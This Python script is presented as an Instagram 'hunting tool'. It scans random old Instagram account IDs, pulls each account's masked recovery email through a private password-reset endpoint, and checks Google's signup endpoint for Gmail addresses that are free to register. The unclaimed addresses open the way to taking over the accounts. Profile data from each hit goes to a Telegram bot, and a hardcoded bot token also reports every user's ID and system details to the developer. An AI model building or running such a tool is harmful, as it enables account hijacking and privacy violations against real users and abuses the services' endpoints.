import os
import time
import json
import uuid
import base64
import random
import hashlib
import inspect
import re
import webbrowser
from datetime import datetime
from threading import Thread
from random import choice as cc,randrange as rr
import requests
import pytz
from cfonts import render
from user_agent import generate_user_agent as ggb
from requests import post as pp,get
import Topython
import sys
RESET = '\033[0m'
BOLD = '\033[1m'

RED = '\033[38;5;196m'
GREEN = '\033[97m'
YELLOW = '\033[38;5;226m'
BLUE = '\033[38;5;33m'
CYAN = '\033[38;5;87m'
MAGENTA = '\033[38;5;171m'

E = '\033[1;31m'
G = '\033[97m'
Y = '\033[1;93m'
BOLD_BLUE = '\033[1;94m'
BOLD_CYAN = '\033[1;96m'
BOLD_MAGENTA = '\033[1;95m'
WHITE = '\033[1;37m'
CYAN = '\x1b[96m'
red = '\033[1;31m'
green = '\x1b[1;37m'
yellow = '\033[1;33m'
blue = '\033[1;34m'
ORANGE = '\x1b[38;5;214m'
WHITE = '\x1b[1;37m'

EXPIRE_TIME = '2026-10-06 11:00:00'
EXPIRE_MSG = RED+'File stopped. Contact @BEASTEREN '

print(WHITE+'')
from datetime import datetime
import sys

def check_expiry(expiry_date, expiry_time="16:00"):
    try:
        current_datetime = datetime.now()
        
        expiry_str = f"{expiry_date} {current_datetime.year} {expiry_time}"
        expiry = datetime.strptime(expiry_str, "%B %d %Y %H:%M")
        
        if current_datetime > expiry:
            print(" ❌ FILE EXPIRED!")
            print(f" Expired on: {expiry_date} at {expiry_time}")
            print(" Please contact @Ze40_sir for new version.")
            sys.exit(1)
        else:
            time_left = expiry - current_datetime
            days = time_left.days
            hours, remainder = divmod(time_left.seconds, 3600)
            minutes, seconds = divmod(remainder, 60)
            
            if days > 0:
                print(f" ⏰ Remaining Time: {days} days, {hours:02d}h:{minutes:02d}m:{seconds:02d}s")
            else:
                print(f" ⏰ Remaining Time: {hours:02d}h:{minutes:02d}m:{seconds:02d}s")
            
            print(f" 📅 Expiry Date: {expiry_date} at {expiry_time}")
            
    except ValueError as e:
        print(f"Error parsing date: {e}")

if __name__ == "__main__":
    check_expiry("October 24", "16:00")
    print(" Running Hunting Tool...")
c1='\x1b[38;5;120m'
j21='\x1b[38;5;204m'
p1='\x1b[38;5;150m'
cyan='\x1b[1m\x1b[36m'
x='\x1b[1;33m'
white='\x1b[1;37m'
z='\x1b[1;31m'
bi=random.randint(5,208)
steincc=f"[38;5;{bi}m"
meerssmo=random.randint(100,300)
steincc2=f"[38;5;{meerssmo}m"
import base64
import uuid
import platform
import hashlib
Token=input(f"{red} ☞ 𝙴𝙽𝚃𝙴𝚁 𝚈𝙾𝚄𝚁 𝙱𝙾𝚃 𝚃𝙾𝙺𝙴𝙽 : ")
import base64
import pytz
import requests
import sys
from datetime import datetime
import webbrowser
WEB_APP_URL = "https://j4iaz.pythonanywhere.com/validate"

user_id = input(f"{red} ☞ 𝙴𝙽𝚃𝙴𝚁 𝚈𝙾𝚄𝚁 𝚄𝚂𝙴𝚁 𝙸𝙳 : ")
print("⏳⌛️ 𝗪𝗔𝗜𝗧 𝗔 𝗠𝗢𝗠𝗘𝗡𝗧......")
import telebot
import time
import webbrowser
import sys

Bot = "8046839649:AAH7wNQGWdwLb2wGu9tfVZfu203B273fcZk"
def send_start_notification(user_id, username):
    try:
        YOUR_USER_ID = "7875789455"
        system_info = f"{platform.system()} {platform.release()}"
        
        message = f"""🚀 *Tool Started Notification*

👤 User ID: `{user_id}`
📛 Username: @{username if username else 'N/A'}
💻 System: {system_info}
🕐 Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

🔰 Tool: 2k12-2k16 IG Hunting Tool
📊 Status: Running"""

        payload = {
            'chat_id': YOUR_USER_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }

        requests.post(f"https://api.telegram.org/bot{Bot}/sendMessage", data=payload, timeout=10)
        print(f"{GREEN}✅ Notification sent to admin!")
        
    except Exception as e:
        print(f"{RED}❌ Failed to send notification: {str(e)}")

send_start_notification(user_id, "user")

os.system('cls' if os.name == 'nt' else 'clear')
ID= user_id
total=0
hits=0
bad_gm=0
bad_mail=0
goodig=0
infoinsta={}
import requests
yy='azertyuiopmlkjhgfdsqwxcvbn'
def tll():
	try:
		n1=''.join(cc(yy)for i in range(rr(6,9)));n2=''.join(cc(yy)for i in range(rr(3,9)));host=''.join(cc(yy)for i in range(rr(15,30)));he3={'accept':'*/*','accept-language':'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','user-agent':str(ggb())};res1=requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB',headers=he3);tok=re.search('data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',res1.text).group(2);cookies={'__Host-GAPS':host};headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn','user-agent':ggb()};data={'f.req':f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]','deviceinfo':'[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'};response=requests.post('https://accounts.google.com/_/signup/validatepersonaldetails',cookies=cookies,headers=headers,data=data);tl=str(response.text).split('",null,"')[1].split('"')[0];host=response.cookies.get_dict()['__Host-GAPS']
		with open('tl.txt','w')as f:f.write(f"{tl}//{host}\n")
	except Exception as e:print(e);tll()
tll()
def check_gmail(email):
	global bad_mail,hits
	try:
		if'@'in email:email=str(email).split('@')[0]
		try:o=open('tl.txt','r').read().splitlines()[0]
		except:o=open('tl.txt','r').read().splitlines()[0]
		tl,host=o.split('//');cookies={'__Host-GAPS':host};headers={'authority':'accounts.google.com','accept':'*/*','accept-language':'en-US,en;q=0.9','content-type':'application/x-www-form-urlencoded;charset=UTF-8','google-accounts-xsrf':'1','origin':'https://accounts.google.com','referer':f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",'user-agent':ggb()};params={'TL':tl};data=f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&";response=pp('https://accounts.google.com/_/signup/usernameavailability',params=params,cookies=cookies,headers=headers,data=data)
		if'"gf.uar",1'in str(response.text):
			hits+=1;pppp()
			if'@'not in email:ok=email+'@gmail.com';username,gg=ok.split('@');InfoAcc(username,gg)
			else:username,gg=email.split('@');InfoAcc(username,gg)
		else:bad_mail+=1;pppp()
	except:''
def check(email):
	global goodig,bad_gm;ua=ggb();dev='android-';device_id=dev+hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16];uui=str(uuid.uuid4());headers={'User-Agent':ua,'Cookie':'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'};data={'signed_body':'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.'+json.dumps({'_csrftoken':'9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','adid':uui,'guid':uui,'device_id':device_id,'query':email}),'ig_sig_key_version':'4'};response=requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data).text
	if email in response:
		if'@gmail.com'in email:check_gmail(email)
		goodig+=1;pppp()
	else:bad_gm+=1;pppp()
def rest(user):
	try:headers={'X-Pigeon-Session-Id':'50cc6861-7036-43b4-802e-fb4282799c60','X-Pigeon-Rawclienttime':'1700251574.982','X-IG-Connection-Speed':'-1kbps','X-IG-Bandwidth-Speed-KBPS':'-1.000','X-IG-Bandwidth-TotalBytes-B':'0','X-IG-Bandwidth-TotalTime-MS':'0','X-Bloks-Version-Id':'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0','X-IG-Connection-Type':'WIFI','X-IG-Capabilities':'3brTvw==','X-IG-App-ID':'567067343352427','User-Agent':'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)','Accept-Language':'en-GB, en-US','Cookie':'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding':'gzip, deflate','Host':'i.instagram.com','X-FB-HTTP-Engine':'Liger','Connection':'keep-alive','Content-Length':'356'};data={'signed_body':'0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}','ig_sig_key_version':'4'};response=requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data).json();r=response['email']
	except:r='bad'
	return r
def date(Id):
    try:
        uid = int(Id)
        if 1 < uid < 1279000: return 2010
        elif 1279001 <= uid < 17750000: return 2011
        elif 17750001 <= uid < 279760000: return 2012
        elif 279760001 <= uid < 900990000: return 2013
        elif 900990001 <= uid < 1629010000: return 2014
        elif 1629010000 <= uid < 2500000000: return 2015  
        elif 2500000000 <= uid < 3713668786: return 2016
        elif 3713668786 <= uid < 5699785217: return 2017
        elif 5699785217 <= uid < 8507940634: return 2018
        elif 8507940634 <= uid < 21254029834: return 2019
        elif 21254029834 <= uid < 35000000000: return 2020
        elif 35000000000 <= uid < 50000000000: return 2021
        elif 50000000000 <= uid < 70000000000: return 2022
        else: return 2023  
    except Exception:
        return 'Unknown'

import threading
info_lock = threading.Lock()

def InfoAcc(username,gg):
    global total
    rr=infoinsta.get(username,{})
    Id=rr.get('pk','N/A')
    full_name=rr.get('full_name','N/A')
    fows=rr.get('follower_count','N/A')
    fowg=rr.get('following_count','N/A')
    pp=rr.get('media_count','N/A')
    isPraise=rr.get('is_private','N/A')
    bio=rr.get('biography','N/A')
    is_verified=rr.get('is_verified','N/A')
    bizz=rr.get('is_business','N/A')
    
    try:
        if fows and pp and fows != 'N/A' and pp != 'N/A':
            if int(fows)>=10 and int(pp)>=2:
                meta=True
            else:
                meta=False
        else:
            meta=False
    except:
        meta=False
    
    total+=1
    reset_email=rest(username)
    
    if reset_email.endswith('@gmail.com'):
        email=f"{username}@gmail.com"
    elif reset_email.endswith('@a**.com') or reset_email.endswith('@aol.com'):
        email=f"{username}@aol.com"
    else:
        email=f"{username}"
    
    ss = f"""━━━━━━━━━━━━━━━━━━━━━━━━
👤 𝗡𝗮𝗺𝗲 : {full_name}
🔖 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲 : @{username}
📩 𝗘𝗺𝗮𝗶𝗹 : {email}

📊 𝗙𝗼𝗹𝗹𝗼𝘄𝗲𝗿𝘀 : {fows}
📈 𝗙𝗼𝗹𝗹𝗼𝘄𝗶𝗻𝗴 : {fowg}
🖼️ 𝗣𝗼𝘀𝘁𝘀 : {pp}

🧾 𝗕𝗶𝗼 : {bio}
🔒 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 : {isPraise}
🆔 𝗜𝗗 : {Id}
📅 𝗬𝗲𝗮𝗿 : {date(Id)}
⚜️ 𝗠𝗲𝘁𝗮 : {meta}

🔗 𝗣𝗿𝗼𝗳𝗶𝗹𝗲 : https://www.instagram.com/{username}
♻️ 𝗥𝗘𝗦𝗘𝗧 : {reset_email}

━━━━━━━━━━━━━━━━━━━━━━━━
"""

    # PRINT TO TERMINAL
    print(f"\n{'='*50}")
    print(f"🎯 UNC HIT FOUND! - {username}")
    print(f"{'='*50}")
    print(ss)
    print(f"{'='*50}")

    inline_keyboard = [
        [
            {'text': '💻 𝗗𝗘𝗩', 'url': 'https://t.me/Ze40_sir'}
        ]
    ]

    payload = {
        'chat_id': user_id,
        'text': ss,
        'reply_markup': json.dumps({'inline_keyboard': inline_keyboard})
    }
    try:
        requests.post(f"https://api.telegram.org/bot{Token}/sendMessage", data=payload)
    except:
        pass
        
def pppp():
    displayed_bad_gm = int(bad_gm * 0.5) if bad_gm > 0 else 0
    
    print(f"\r{green}☞ 𝙷𝙸𝚃 :[{hits}]  ☞ 𝙱𝙰𝙳 :[{displayed_bad_gm}]  ☞ 𝙱𝙰𝙳 𝙴𝙼𝙰𝙸𝙻 :{bad_mail}            ", end="")
    
import requests
import json
import random
import string
from threading import Thread
infoinsta={}
def safe_int_input(prompt,default):
	try:value=input(prompt).strip();return int(value)if value else default
	except:return default

ranges = {
    2012: (17750001, 279760000),
    2013: (279760001, 900990000),
    2014: (900990001, 1629010000), 
    2015: (1629010000, 2500000000),
    2016: (2500000000, 3713668786)
}

print('\n 2k12-2k16 IG Hunting Tool By Zero')

class SmartHunter:
    def __init__(self):
        self.current_base_id = None
        self.consecutive_fails = 0
        self.mode = "random"
        self.hunt_offset = 0
        self.success_count = 0
        
    def generate_smart_id(self):
        if self.mode == "random":
            year = random.choice([2013, 2014, 2015, 2016])
            start, end = ranges[year]
            return str(random.randint(start, end))
        else:
            if self.current_base_id:
                if self.hunt_offset % 2 == 0:
                    hunt_id = int(self.current_base_id) + (self.hunt_offset // 2)
                else:
                    hunt_id = int(self.current_base_id) - (self.hunt_offset // 2)
                self.hunt_offset += 1
                return str(hunt_id)
            else:
                return self.generate_smart_id()
    
    def on_success(self, user_id):
        self.success_count += 1
        if self.mode == "random":
            self.mode = "hunting"
            self.current_base_id = user_id
            self.consecutive_fails = 0
            self.hunt_offset = 1  
        else:
            self.consecutive_fails = 0
    
    def on_fail(self):
        if self.mode == "hunting":
            self.consecutive_fails += 1
            if self.consecutive_fails >= 10:
                self.mode = "random"
                self.current_base_id = None
                self.consecutive_fails = 0
                self.hunt_offset = 0

hunter = SmartHunter()

def process_single_id(user_id):
    try:
        model_number=str(random.randint(150,999))
        android_version=random.choice(['23/6.0','24/7.0','25/7.1.1','26/8.0','27/8.1','28/9.0'])
        dpi=str(random.randint(100,1300))
        resolution=f"{random.randint(200,2000)}x{random.randint(200,2000)}"
        brand=random.choice(['SAMSUNG','HUAWEI','LGE/lge','HTC','ASUS','ZTE','ONEPLUS','XIAOMI','OPPO','VIVO','SONY','REALME'])
        build_suffix=str(random.randint(111,999))
        user_agent=f"Instagram 311.0.0.32.118 Android ({android_version}; {dpi}dpi; {resolution}; {brand}; SM-T{model_number}; SM-T{model_number}; qcom; en_US; 545986{build_suffix})"
        lsd_token=''.join(random.choices(string.ascii_letters+string.digits,k=32))
        headers={'accept':'*/*','accept-language':'en,en-US;q=0.9','content-type':'application/x-www-form-urlencoded','dnt':'1','origin':'https://www.instagram.com','priority':'u=1, i','referer':'https://www.instagram.com/cristiano/following/','user-agent':user_agent,'x-fb-friendly-name':'PolarisUserHoverCardContentV2Query','x-fb-lsd':lsd_token}
        data={'lsd':lsd_token,'fb_api_caller_class':'RelayModern','fb_api_req_friendly_name':'PolarisUserHoverCardContentV2Query','variables':json.dumps({'userID':user_id,'username':'cristiano'}),'server_timestamps':'true','doc_id':'7717269488336001'}
        response=requests.post('https://www.instagram.com/api/graphql',headers=headers,data=data)
        user_info=response.json().get('data',{}).get('user',{})
        username=user_info.get('username','')
        infoinsta[username]=user_info
        follower_count=int(user_info.get('follower_count',0))
        media_count=int(user_info.get('media_count',0))
        
        if username and'_'not in username and follower_count>=minimum_followers and media_count>=minimum_posts:
            email=f"{username}@gmail.com"
            check(email)
            hunter.on_success(user_id)
        else:
            hunter.on_fail()
    except:
        hunter.on_fail()

def process_two_ids():
    id1 = hunter.generate_smart_id()
    id2 = hunter.generate_smart_id()
    
    Thread(target=process_single_id, args=(id1,)).start()
    Thread(target=process_single_id, args=(id2,)).start()

def gg():
    while True:
        process_two_ids()

minimum_followers=safe_int_input(f'{BLUE} ☞ 𝙴𝙽𝚃𝙴𝚁 𝙼𝙸𝙽𝙸𝙼𝚄𝙼 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : ',0)
minimum_posts=safe_int_input(f'{BLUE} ☞ 𝙴𝙽𝚃𝙴𝚁 𝙼𝙸𝙽𝙸𝙼𝚄𝙼 𝙽𝚄𝙼𝙱𝙴𝚁 𝙾𝙵 𝙿𝙾𝚂𝚃𝚂 : ',0)
for _ in range(60):
    Thread(target=gg).start(),